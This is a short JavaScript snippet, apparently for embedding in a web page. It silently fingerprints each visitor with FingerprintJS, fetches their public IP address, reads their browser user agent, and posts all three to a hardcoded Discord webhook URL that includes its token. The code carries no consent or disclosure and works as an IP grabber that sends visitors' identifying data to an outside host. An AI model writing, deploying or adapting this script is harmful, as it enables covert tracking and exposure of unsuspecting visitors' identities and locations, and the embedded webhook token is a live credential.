import('https://openfpcdn.io/fingerprintjs/v3')
  .then(FP => FP.load())
  .then(fp => {
    Promise.all([fp.get(), fetch('https://api.ipify.org?format=json').then(r => r.json())])
      .then(([{visitorId}, {ip}]) => {
        const f = visitorId;
        const i = ip;
        const ua = navigator.userAgent;
        const url = 'https://discord.com/api/webhooks/1346691903265181697/HRcuwXPFPsr6Y0nbNj3jH9C8cvQ_jJqi0OayLg_XJPSELEU1lt48kNmXINXZFsvJ934Z';
        fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: '🆕 New Information 🆕',
              color: 3447003,
              fields: [
                { name: '🖐️ Fingerprint', value: f, inline: false },
                { name: '🌍 IP', value: i, inline: false },
                { name: '🖥️ User Agent', value: ua, inline: false }
              ]
            }]
          })
        });
      });
  });
